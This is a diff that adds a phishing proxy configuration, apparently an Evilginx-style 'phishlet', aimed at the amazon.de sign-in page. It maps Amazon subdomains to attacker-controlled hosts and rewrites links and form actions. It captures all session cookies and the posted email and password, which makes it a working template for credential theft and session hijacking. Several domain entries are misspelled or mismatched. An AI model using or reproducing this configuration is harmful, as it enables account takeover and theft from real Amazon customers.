@@ -1,0 +1,40 @@
+author: '@horllste'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'amazon.de', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'fls-eu', orig_sub: 'fls-eu', domain: 'amazon.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'images-na', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'images-eu', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'm', orig_sub: 'm', domain: 'media-amazon.com', session: false, is_landing: false, auto_filter: false}
+sub_filters:
+  - {triggers_on: 'www.amazon.de', orig_sub: 'www', domain: 'amazon.de', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'www.amazon.de', orig_sub: 'www', domain: 'amazon.de', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-eu.amazon.com', orig_sub: 'fls-eu', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'fls-eu.amazon.com', orig_sub: 'fls-eu', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-iges-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-eu.ssl-iamges-amazon.com', orig_sub: 'images-eu', domain: 'ssl-iges-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-eu.ssl-iamges-amazon.com', orig_sub: 'images-eu', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'm.media-amazon.com', orig_sub: 'm', domain: 'media-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+auth_tokens:
+  - domain: '.amazon.de'
+    keys: ['.*,regexp']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.amazon.de'
+  path: '/ap/signin?_encoding=UTF8&ignoreAuthState=1&openid.assoc_handle=deflex&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.mode=checkid_setup&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.de%2Fref%3Dnav_signin&switch_account='
+auth_urls:
+  - '/'
+  - '/?ref_=nav_signin&'
+
+
+
+
